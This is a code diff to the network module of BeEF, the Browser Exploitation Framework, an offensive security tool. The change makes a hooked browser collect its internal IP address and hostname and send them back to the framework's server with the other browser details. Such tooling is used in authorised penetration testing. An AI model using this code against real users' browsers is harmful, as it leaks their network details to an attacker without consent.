@@ -106,10 +106,19 @@ beef.net = {
 	sendback_browser_details: function() {
 		// get hash of browser details
 		var details = beef.browser.getDetails();
-
+		
+		// grab the internal ip address and hostname
+		var internal_ip = beef.net.local.getLocalAddress();
+		var internal_hostname = beef.net.local.getLocalHostname();
+		
+		if(internal_ip && internal_hostname) {
+			details['InternalIP'] = internal_ip;
+			details['InternalHostname'] = internal_hostname;
+		}
+		
 		// contruct param string
 		var params = this.construct_params_from_hash(details);
-
+		
 		// return data to the framework
 		this.sendback("/init", 0, params);
 	},
